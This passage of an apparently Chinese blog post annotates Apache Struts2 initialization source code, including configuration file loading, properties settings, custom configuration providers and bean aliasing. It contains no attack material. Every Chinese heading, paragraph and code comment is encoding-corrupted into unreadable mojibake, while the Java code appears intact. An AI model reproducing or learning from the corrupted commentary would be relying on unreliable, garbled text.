includedFileNames.add(fileName);</span><br><span class="line"></span><br><span class="line">        Iterator&lt;URL&gt; urls = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">IOException</span> <span class="variable">ioException</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// é€šè¿‡èµ„æºåè·å–æ‰€æœ‰å¦ˆç¥–æ¡ä»¶çš„èµ„æºçš„è·¯å¾„</span></span><br><span class="line">        urls = getConfigurationUrls(fileName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ioException = ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (urls == <span class="literal">null</span> || !urls.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errorIfMissing) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Could not open files of the name &quot;</span> + fileName, ioException);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LOG.trace(<span class="string">&quot;Unable to locate configuration files of the name &#123;&#125;, skipping&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> docs;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (urls.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        url = urls.next();</span><br><span class="line">        <span class="comment">// é€šè¿‡æ–‡ä»¶ç®¡ç†å™¨å»åŠ è½½æ–‡ä»¶äº†   é»˜è®¤æ—¶jbossfilemanager</span></span><br><span class="line">        is = fileManager.loadFile(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">InputSource</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(is);</span><br><span class="line"></span><br><span class="line">        in.setSystemId(url.toString());</span><br><span class="line">        <span class="comment">// è§£æxmlæ–‡ä»¶æ·»åŠ åˆ°docsä¸­</span></span><br><span class="line">        docs.add(DomHelper.parse(in, dtdMappings));</span><br><span class="line">        loadedFileUrls.add(url.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XWorkException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (includeElement != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to load &quot;</span> + url, e, includeElement);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to load &quot;</span> + url, e);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Caught exception while loading file &quot;</span> + fileName, e, includeElement);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        is.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        LOG.error(<span class="string">&quot;Unable to close input stream&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//sort the documents, according to the &quot;order&quot; attribute</span></span><br><span class="line">        <span class="comment">// å¯¹æ–‡æ¡£è¿›è¡Œæ’åº</span></span><br><span class="line">        Collections.sort(docs, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Document&gt;() &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Document doc1, Document doc2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> XmlHelper.getLoadOrder(doc1).compareTo(XmlHelper.getLoadOrder(doc2));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// è§£ææ–‡æ¡£ä¸­çš„ include æ ‡ç­¾ ç„¶åå°†åŒ…å«çš„xmlæ–‡ä»¶ä¹ŸåŠ è½½åˆ°docsä¸­</span></span><br><span class="line">        <span class="keyword">for</span> (Document doc : docs) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getDocumentElement();</span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">children</span> <span class="operator">=</span> rootElement.getChildNodes();</span><br><span class="line">        <span class="type">int</span> <span class="variable">childSize</span> <span class="operator">=</span> children.getLength();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; childSize; i++) &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">childNode</span> <span class="operator">=</span> children.item(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (childNode <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">child</span> <span class="operator">=</span> (Element) childNode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">nodeName</span> <span class="operator">=</span> child.getNodeName();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;include&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">includeFileName</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (includeFileName.indexOf(<span class="string">&#x27;*&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// handleWildCardIncludes(includeFileName, docs, child);</span></span><br><span class="line">        <span class="type">ClassPathFinder</span> <span class="variable">wildcardFinder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathFinder</span>();</span><br><span class="line">        wildcardFinder.setPattern(includeFileName);</span><br><span class="line">        Vector&lt;String&gt; wildcardMatches = wildcardFinder.findMatches();</span><br><span class="line">        <span class="keyword">for</span> (String match : wildcardMatches) &#123;</span><br><span class="line">        finalDocs.addAll(loadConfigurationFiles(match, child));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        finalDocs.addAll(loadConfigurationFiles(includeFileName, child));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        finalDocs.add(doc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOG.debug(<span class="string">&quot;Loaded action configuration from: &#123;&#125;&quot;</span>, fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> finalDocs;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="é—ç•™å±æ€§çš„åˆå§‹åŒ–"><a href="#é—ç•™å±æ€§çš„åˆå§‹åŒ–" class="headerlink" title="é—ç•™å±æ€§çš„åˆå§‹åŒ–"></a>é—ç•™å±æ€§çš„åˆå§‹åŒ–</h3><p>å°† <code>PropertiesConfigurationProvider</code>å¯¹è±¡æ·»åŠ åˆ°<code>containerProvider</code>ä¸­  å…³æ³¨å…¶registeræ–¹æ³• </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">DefaultSettings</span> <span class="variable">settings</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSettings</span>();</span><br><span class="line">loadSettings(props, settings);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">DefaultSettings</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Settings&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// stuts.properties, default.properties</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åŠ è½½æ‰€æœ‰çš„ struts.propertiesæ–‡ä»¶</span></span><br><span class="line">            list.add(<span class="keyword">new</span> <span class="title class_">PropertiesSettings</span>(<span class="string">&quot;struts&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            LOG.warn(<span class="string">&quot;DefaultSettings: Could not find or error in struts.properties&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        delegate = <span class="keyword">new</span> <span class="title class_">DelegatingSettings</span>(list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// struts.custom.properties</span></span><br><span class="line">    <span class="comment">// è·å– struts.properties ä¸­çš„ struts.custom.properties å±æ€§çš„å€¼ </span></span><br><span class="line">    <span class="comment">// è¿™ä¸ªå€¼æŒ‡å‘äº†å…¶ä»–çš„é…ç½®æ–‡ä»¶ é€šè¿‡é€—å·åˆ†éš”</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">files</span> <span class="operator">=</span> delegate.get(StrutsConstants.STRUTS_CUSTOM_PROPERTIES);</span><br><span class="line">        <span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">StringTokenizer</span> <span class="variable">customProperties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(files, <span class="string">&quot;,&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (customProperties.hasMoreTokens()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> customProperties.nextToken();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// å°†æ‰€æœ‰çš„æ–‡ä»¶è¿›è¡Œè¯»å–è§£æå°è£…æˆ PropertiesSettings å¯¹è±¡</span></span><br><span class="line">                    list.add(<span class="keyword">new</span> <span class="title class_">PropertiesSettings</span>(name));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOG.error(<span class="string">&quot;DefaultSettings: Could not find &#123;&#125;.properties. Skipping.&quot;</span>, name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// åˆ›å»ºä¸€ä¸ªå§”æ‰˜å¯¹è±¡</span></span><br><span class="line">            <span class="comment">// åé¢è°ƒç”¨çš„loadSettingæ–¹æ³•å°†è°ƒç”¨delegateçš„listæ–¹æ³•è·å–æ‰€æœ‰çš„é…ç½®å¹¶é€ä¸ªéå†å¤åˆ¶åˆ°æ€§çš„propå¯¹è±¡ä¸­</span></span><br><span class="line">            delegate = <span class="keyword">new</span> <span class="title class_">DelegatingSettings</span>(list);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="åˆå§‹åŒ–ç”¨æˆ·è‡ªå®šä¹‰çš„é…ç½®Provider"><a href="#åˆå§‹åŒ–ç”¨æˆ·è‡ªå®šä¹‰çš„é…ç½®Provider" class="headerlink" title="åˆå§‹åŒ–ç”¨æˆ·è‡ªå®šä¹‰çš„é…ç½®Provider"></a>åˆå§‹åŒ–ç”¨æˆ·è‡ªå®šä¹‰çš„é…ç½®Provider</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init_CustomConfigurationProviders</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// è·å–è¿‡æ»¤å™¨å±æ€§  configProviders</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">configProvs</span> <span class="operator">=</span> initParams.get(<span class="string">&quot;configProviders&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (configProvs != <span class="literal">null</span>) &#123;</span><br><span class="line">            String[] classes = configProvs.split(<span class="string">&quot;\\s*[,]\\s*&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (String cname : classes) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// åŠ è½½ç±»</span></span><br><span class="line">                    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ClassLoaderUtil.loadClass(cname, <span class="built_in">this</span>.getClass());</span><br><span class="line">                    <span class="comment">// ç±»å®ä¾‹åŒ–</span></span><br><span class="line">                    <span class="type">ConfigurationProvider</span> <span class="variable">prov</span> <span class="operator">=</span> (ConfigurationProvider)cls.newInstance();</span><br><span class="line">                    <span class="comment">// å¦‚æœæ—¶ ServletContextAwareConfigurationProvider çš„å­ç±» è¿˜éœ€è¦å…ˆè°ƒç”¨ initWithContext æ–¹æ³•</span></span><br><span class="line">                    <span class="comment">// ä¸»è¦æ˜¯çœ‹æ˜¯å¦éœ€è¦ä½¿ç”¨åˆ°servletContexté‡Œé¢çš„æ•°æ®</span></span><br><span class="line">                    <span class="keyword">if</span> (prov <span class="keyword">instanceof</span> ServletContextAwareConfigurationProvider) &#123;</span><br><span class="line">                        ((ServletContextAwareConfigurationProvider)prov).initWithContext(servletContext);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// æ·»åŠ åˆ°å®¹å™¨ä¸­</span></span><br><span class="line">                    configurationManager.addContainerProvider(prov);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to instantiate provider: &quot;</span>+cname, e);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to access provider: &quot;</span>+cname, e);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to locate provider class: &quot;</span>+cname, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="åˆå§‹åŒ–è¿‡æ»¤å™¨å‚æ•°"><a href="#åˆå§‹åŒ–è¿‡æ»¤å™¨å‚æ•°" class="headerlink" title="åˆå§‹åŒ–è¿‡æ»¤å™¨å‚æ•°"></a>åˆå§‹åŒ–è¿‡æ»¤å™¨å‚æ•°</h3><p>å°†è¿‡æ»¤å™¨å‚æ•°æ·»åŠ åˆ°  register æ–¹æ³•ä¼ å…¥çš„ LocatableProperties å¯¹è±¡ä¸­</p>
<h3 id="åˆå§‹åŒ–æ ‡å‡†å¯¹è±¡çš„åˆ«åï¼ˆå°†æ ‡å‡†å¯¹è±¡æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼‰"><a href="#åˆå§‹åŒ–æ ‡å‡†å¯¹è±¡çš„åˆ«åï¼ˆå°†æ ‡å‡†å¯¹è±¡æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼‰" class="headerlink" title="åˆå§‹åŒ–æ ‡å‡†å¯¹è±¡çš„åˆ«åï¼ˆå°†æ ‡å‡†å¯¹è±¡æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼‰"></a>åˆå§‹åŒ–æ ‡å‡†å¯¹è±¡çš„åˆ«åï¼ˆå°†æ ‡å‡†å¯¹è±¡æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼‰</h3><p>åˆ›å»º DefaultBeanSelectionProvider å¹¶æ”¾åˆ°å®¹å™¨é‡Œ<br>ä¸ºä¸€äº›æ ‡å‡†å¯¹è±¡è®¾ç½®åˆ«å  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ContainerBuilder builder, LocatableProperties props)</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºåˆ«å å…¶å®å°±æ˜¯å°†ä¸€äº›æ ‡å‡†å¯¹è±¡åŠ å…¥åˆ°å®¹å™¨ä¸­</span></span><br><span class="line">    alias(ObjectFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY, builder, props);</span><br><span class="line">    alias(ActionFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_ACTIONFACTORY, builder, props);</span><br><span class="line">    alias(ResultFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_RESULTFACTORY, builder, props);</span><br><span class="line">    alias(ConverterFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_CONVERTERFACTORY, builder, props);</span><br><span class="line">    alias(InterceptorFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_INTERCEPTORFACTORY, builder, props);</span><br><span class="line">    alias(ValidatorFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_VALIDATORFACTORY, builder, props);</span><br><span class="line">    alias(UnknownHandlerFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_UNKNOWNHANDLERFACTORY, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(FileManagerFactory.class, StrutsConstants.STRUTS_FILE_MANAGER_FACTORY, builder, props, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    alias(XWorkConverter.class, StrutsConstants.STRUTS_XWORKCONVERTER, builder, props);</span><br><span class="line">    alias(CollectionConverter.class, StrutsConstants.STRUTS_CONVERTER_COLLECTION, builder, props);</span><br><span class="line">    alias(ArrayConverter.class, StrutsConstants.STRUTS_CONVERTER_ARRAY, builder, props);</span><br><span class="line">    alias(DateConverter.class, StrutsConstants.STRUTS_CONVERTER_DATE, builder, props);</span><br><span class="line">    alias(NumberConverter.class, StrutsConstants.STRUTS_CONVERTER_NUMBER, builder, props);</span><br><span class="line">    alias(StringConverter.class, StrutsConstants.STRUTS_CONVERTER_STRING, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(ConversionPropertiesProcessor.class, StrutsConstants.STRUTS_CONVERTER_PROPERTIES_PROCESSOR, builder, props);</span><br><span class="line">    alias(ConversionFileProcessor.class, StrutsConstants.STRUTS_CONVERTER_FILE_PROCESSOR, builder, props);</span><br><span class="line">    alias(ConversionAnnotationProcessor.class, StrutsConstants.STRUTS_CONVERTER_ANNOTATION_PROCESSOR, builder, props);</span><br><span class="line">    alias(TypeConverterCreator.class, StrutsConstants.STRUTS_CONVERTER_CREATOR, builder, props);</span><br><span class="line">    alias(TypeConverterHolder.class, StrutsConstants.STRUTS_CONVERTER_HOLDER, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(TextProvider.class, StrutsConstants.STRUTS_XWORKTEXTPROVIDER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(TextProvider.class, StrutsConstants.STRUTS_TEXT_PROVIDER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(TextProviderFactory.class, StrutsConstants.STRUTS_TEXT_PROVIDER_FACTORY, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(LocaleProviderFactory.class, StrutsConstants.STRUTS_LOCALE_PROVIDER_FACTORY, builder, props);</span><br><span class="line">    alias(LocalizedTextProvider.class, StrutsConstants.STRUTS_LOCALIZED_TEXT_PROVIDER, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(ActionProxyFactory.class, StrutsConstants.STRUTS_ACTIONPROXYFACTORY, builder, props);</span><br><span class="line">    alias(ObjectTypeDeterminer.class, StrutsConstants.STRUTS_OBJECTTYPEDETERMINER, builder, props);</span><br><span class="line">    alias(ActionMapper.class, StrutsConstants.STRUTS_MAPPER_CLASS, builder, props);</span><br><span class="line">    alias(MultiPartRequest.class, StrutsConstants.STRUTS_MULTIPART_PARSER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(FreemarkerManager.class, StrutsConstants.STRUTS_FREEMARKER_MANAGER_CLASSNAME, builder, props);</span><br><span class="line">    alias(VelocityManager.class, StrutsConstants.STRUTS_VELOCITY_MANAGER_CLASSNAME, builder, props);</span><br><span class="line">    alias(UrlRenderer.class, StrutsConstants.STRUTS_URL_RENDERER, builder, props);</span><br><span class="line">    alias(ActionValidatorManager.class, StrutsConstants.STRUTS_ACTIONVALIDATORMANAGER, builder, props);</span><br><span class="line">    alias(ValueStackFactory.class, StrutsConstants.STRUTS_VALUESTACKFACTORY, builder, props);</span><br><span class="line">    alias(ReflectionProvider.class, StrutsConstants.STRUTS_REFLECTIONPROVIDER, builder, props);</span><br><span class="line">    alias(ReflectionContextFactory.class, StrutsConstants.STRUTS_REFLECTIONCONTEXTFACTORY, builder, props);</span><br><span class="line">    alias(PatternMatcher.class, StrutsConstants.STRUTS_PATTERNMATCHER, builder, props);</span><br><span class="line">    alias(ContentTypeMatcher.class, StrutsConstants.STRUTS_CONTENT_TYPE_MATCHER, builder, props);</span><br><span class="line">    alias(StaticContentLoader.class, StrutsConstants.STRUTS_STATIC_CONTENT_LOADER, builder, props);</span><br><span class="line">    alias(UnknownHandlerManager.class, StrutsConstants.STRUTS_UNKNOWN_HANDLER_MANAGER, builder, props);</span><br><span class="line">    alias(UrlHelper.class, StrutsConstants.STRUTS_URL_HELPER, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(TextParser.class, StrutsConstants.STRUTS_EXPRESSION_PARSER, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(DispatcherErrorHandler.class, StrutsConstants.STRUTS_DISPATCHER_ERROR_HANDLER, builder, props);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Checker is used mostly in interceptors, so there be one instance of checker per interceptor with Scope.PROTOTYPE **/</span></span><br><span class="line">    alias(ExcludedPatternsChecker.class, StrutsConstants.STRUTS_EXCLUDED_PATTERNS_CHECKER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(AcceptedPatternsChecker.class, StrutsConstants.STRUTS_ACCEPTED_PATTERNS_CHECKER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(NotExcludedAcceptedPatternsChecker.class, StrutsConstants.STRUTS_NOT_EXCLUDED_ACCEPTED_PATTERNS_CHECKER</span><br><span class="line">            , builder, props, Scope.SINGLETON);</span><br><span class="line">    <span class="comment">// åˆ‡æ¢åˆ°å•Šå¼€å‘æ¨¡å¼ å–å†³äº  é…ç½®æ–‡ä»¶ä¸­æ˜¯å¦æœ‰é…ç½®</span></span><br><span class="line">    switchDevMode(props);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert Struts properties into XWork properties</span></span><br><span class="line">    <span class="comment">// ç»™strutsçš„ä¸€äº›å‚æ•°æ¢ä¸ªåå­—  æœ‰å•¥ç”¨ä¸æ¸…æ¥š</span></span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_LOG_MISSING_PROPERTIES, XWorkConstants.LOG_MISSING_PROPERTIES);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ENABLE_OGNL_EXPRESSION_CACHE, XWorkConstants.ENABLE_OGNL_EXPRESSION_CACHE);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ENABLE_OGNL_EVAL_EXPRESSION, XWorkConstants.ENABLE_OGNL_EVAL_EXPRESSION);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ALLOW_STATIC_METHOD_ACCESS, XWorkConstants.ALLOW_STATIC_METHOD_ACCESS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_CONFIGURATION_XML_RELOAD, XWorkConstants.RELOAD_XML_CONFIGURATION);</span><br><span class="line"></span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_EXCLUDED_CLASSES, XWorkConstants.OGNL_EXCLUDED_CLASSES);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_EXCLUDED_PACKAGE_NAME_PATTERNS, XWorkConstants.OGNL_EXCLUDED_PACKAGE_NAME_PATTERNS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_EXCLUDED_PACKAGE_NAMES, XWorkConstants.OGNL_EXCLUDED_PACKAGE_NAMES);</span><br><span class="line"></span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ADDITIONAL_EXCLUDED_PATTERNS, XWorkConstants.ADDITIONAL_EXCLUDED_PATTERNS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ADDITIONAL_ACCEPTED_PATTERNS, XWorkConstants.ADDITIONAL_ACCEPTED_PATTERNS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_OVERRIDE_EXCLUDED_PATTERNS, XWorkConstants.OVERRIDE_EXCLUDED_PATTERNS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_OVERRIDE_ACCEPTED_PATTERNS, XWorkConstants.OVERRIDE_ACCEPTED_PATTERNS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">alias</span><span class="params">(Class type, String key, ContainerBuilder builder, Properties props, Scope scope)</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœè¿™ä¸ªæ ‡å‡†å¯¹è±¡ç›®å‰è¿˜æ²¡æœ‰è¢«æ·»åŠ åˆ°å®¹å™¨ä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (!builder.contains(type, Container.DEFAULT_NAME)) &#123;</span><br><span class="line">            <span class="comment">// æŸ¥çœ‹é…ç½®æ–‡ä»¶ä¸­æ˜¯å¦è®¾ç½®äº†è¿™ä¸ªå¯¹è±¡çš„åç§°</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">foundName</span> <span class="operator">=</span> props.getProperty(key, DEFAULT_BEAN_NAME);</span><br><span class="line">            <span class="comment">// å¦‚æœåœ¨å®¹å™¨ä¸­é€šè¿‡é…ç½®çš„åç§°å’Œç±»å‹æ‰¾åˆ°äº†å¯¹åº”çš„bean </span></span><br><span class="line">            <span class="comment">// ä»€ä¹ˆæƒ…å†µä¸‹beanä¼šå…ˆäºç¨‹åºå¯åŠ¨è¢«è£…å…¥åˆ°å®¹å™¨ä¸­ï¼Ÿ</span></span><br><span class="line">            <span class="comment">// åªèƒ½æ˜¯ç”¨äºåœ¨struts.xmlç­‰é…ç½®æ–‡ä»¶ä¸­é…ç½®äº†beanï¼Œè¦†ç›–äº†æ ‡å‡†å¯¹è±¡</span></span><br><span class="line">            <span class="comment">// é‚£ä¹ˆå°±éœ€è¦ä¸ºè¿™ä¸ªå¯¹è±¡è¿›è¡Œæ·»åŠ ç³»ç»Ÿé»˜è®¤çš„åç§°ä»¥é¿å…æ¡†æ¶è¿è¡Œæ—¶æ‰¾ä¸åˆ°æ ‡å‡†å¯¹è±¡</span></span><br><span class="line">            <span class="keyword">if</span> (builder.contains(type, foundName)) &#123;</span><br><span class="line">                LOG.trace(<span class="string">&quot;Choosing bean (&#123;&#125;) for (&#123;&#125;)&quot;</span>, foundName, type.getName());</span><br><span class="line">                <span class="comment">// é‚£ä¹ˆç»™è¿™ä¸ªæ ‡å‡†å¯¹è±¡æ·»åŠ ä¸€ä¸ªåˆ«åä¸º  default</span></span><br><span class="line">                builder.alias(type, foundName, Container.DEFAULT_NAME);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// å¦‚æœå®¹å™¨ä¸­æ‰¾ä¸åˆ°å¯¹è±¡ åˆ™è¯æ˜è¯¥æ ‡å‡†å¯¹è±¡è¿˜æ²¡æœ‰è¢«æ·»åŠ åˆ°å®¹å™¨ä¸­</span></span><br><span class="line">                    <span class="comment">// é€šè¿‡é…ç½®çš„åç§°è¿›è¡Œç±»åŠ è½½  è¿™é‡Œè¯æ˜é…ç½®çš„åç§°åº”è¯¥æ˜¯ä¸€ä¸ªå…¨ç±»å</span></span><br><span class="line">                    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ClassLoaderUtil.loadClass(foundName, <span class="built_in">this</span>.getClass());</span><br><span class="line">                    LOG.trace(<span class="string">&quot;Choosing bean (&#123;&#125;) for (&#123;&#125;)&quot;</span>, cls.getName(), type.getName());</span><br><span class="line">                    <span class="comment">// å¦‚æœæ‰¾åˆ°äº†å¯¹ä¸€ä¸ªçš„ç±»å¹¶æˆåŠŸåŠ è½½ é‚£ä¹ˆåŠ uå°†è¿™ä¸ªç±»æ·»åŠ åˆ°å®¹å™¨ä¸­</span></span><br><span class="line">                    <span class="comment">// ä½¿ç”¨çš„åç§°ä¸º default </span></span><br><span class="line">                    builder.factory(type, cls, scope);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                    <span class="comment">// Perhaps a spring bean id, so we&#x27;ll delegate to the object factory at runtime</span></span><br><span class="line">                    LOG.trace(<span class="string">&quot;Choosing bean (&#123;&#125;) for (&#123;&#125;) to be loaded from the ObjectFactory&quot;</span>, foundName, type.getName());</span><br><span class="line">                    <span class="keyword">if</span> (DEFAULT_BEAN_NAME.equals(foundName)) &#123;</span><br><span class="line">                        <span class="comment">// Probably an optional bean, will 